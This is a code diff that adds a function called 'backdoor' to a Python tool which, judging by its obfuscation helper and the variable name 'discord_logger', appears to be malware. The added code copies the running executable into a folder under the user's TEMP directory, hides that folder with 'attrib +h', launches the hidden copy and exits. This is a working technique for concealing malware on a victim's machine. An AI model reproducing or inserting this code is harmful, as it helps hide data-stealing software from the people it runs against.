@@ -88,3 +88,27 @@ def obfusacate(fileName:str):
     '''
     obfuscate_code(fileName)
 
+
+def backdoor(folder_name:str):
+    '''
+    Simple backdoor script
+
+    Syntax = "backdoor_folder"
+
+    '''
+    temp                = os.getenv('TEMP')
+    name                = os.path.splitext(os.path.basename(__file__))[0]
+    backdoor_folder     = temp + f"\\{folder_name}"
+    discord_logger      = backdoor_folder + f"\\{name}.exe"
+    file_path           = sys.argv[0]
+
+
+    if file_path != discord_logger:
+        if not os.path.isdir(backdoor_folder): 
+            os.mkdir(backdoor_folder)                                       # Create the folder if it doesn't exist
+            os.system("attrib +h " + backdoor_folder)                       # Hide the folder 
+
+        shutil.copy2(file_path, discord_logger)                             # Copy the file to the backdoor folder
+        os.startfile(discord_logger)                                        # Start the file
+        os._exit(1)
+        
